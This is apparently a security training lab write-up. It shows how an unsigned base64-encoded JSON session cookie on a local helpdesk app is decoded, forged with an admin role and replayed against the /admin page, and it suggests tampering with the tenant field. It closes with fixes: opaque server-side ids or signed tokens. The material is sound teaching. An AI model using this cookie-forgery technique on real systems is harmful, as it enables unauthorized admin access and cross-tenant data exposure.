# Lab 03 — Helpdesk

## Recon

```bash
h5i browser open http://127.0.0.1:9030/login --session lab03 --new --capture
h5i websec show res_0 --session lab03 --raw
```

```
set-cookie: session=eyJ1c2VyIjogImd1ZXN0IiwgInJvbGUiOiAiYWdlbnQiLCAidGVuYW50IjogImFjbWUifQ; Path=/
```

`eyJ` is the tell. Any base64 blob starting `eyJ` decodes to something that
starts `{"` — it is JSON in a coat.

```bash
python3 -c 'import base64;print(base64.urlsafe_b64decode("eyJ1c2Vy…"+"=="))'
{"user": "guest", "role": "agent", "tenant": "acme"}
```

Three dots would have made it a JWT (Lab 10). No dots means **no signature at
all**: header, payload, and nothing that binds the value to this server.

## The bug

```python
def seal(claims): return base64.urlsafe_b64encode(json.dumps(claims).encode())
```

`seal` names an intention the code does not carry out. Encoding is not
integrity. The server later reads `claims["role"]` and believes it.

## The exploit

Mint the token you want and send it as a cookie:

```bash
FORGED=$(python3 -c 'import base64,json;print(base64.urlsafe_b64encode(
  json.dumps({"user":"guest","role":"admin","tenant":"acme"}).encode()).decode().rstrip("="))')

h5i websec replay req_0 --session lab03 --create \
    --set path=/admin --set "cookie.session=$FORGED"
```

`--set cookie.<name>` rewrites one cookie in the outgoing `Cookie` header and
leaves the rest of the jar alone — the difference between testing one claim and
logging out.

## Read the shape, not the label

Field names in an unsigned token are an attack surface map. `role` is the
obvious one; `tenant` is the interesting one, because changing it is a
cross-tenant test that no permission check in this app would even notice. When
you find a forgeable token, enumerate *every* field, not the one named `role`.

## The fix

Two acceptable designs, and one that is not:

* **Opaque id.** The cookie is a random 128-bit handle; the claims live in a
  server-side store. Nothing to forge because nothing is carried.
* **Signed token.** HMAC or a signature over the claims, verified before use,
  with the algorithm pinned server-side (see Lab 10 for what happens when it is
  not).
* **Not acceptable:** encrypting or encoding the claims and calling it done.
  Confidentiality is not integrity.

## h5i technique

`--set cookie.name=value` for one cookie; `--set header.Cookie=…` when you want
to control the whole header including its order — some parsers take the first
duplicate and some the last, and that difference is itself a bug class.
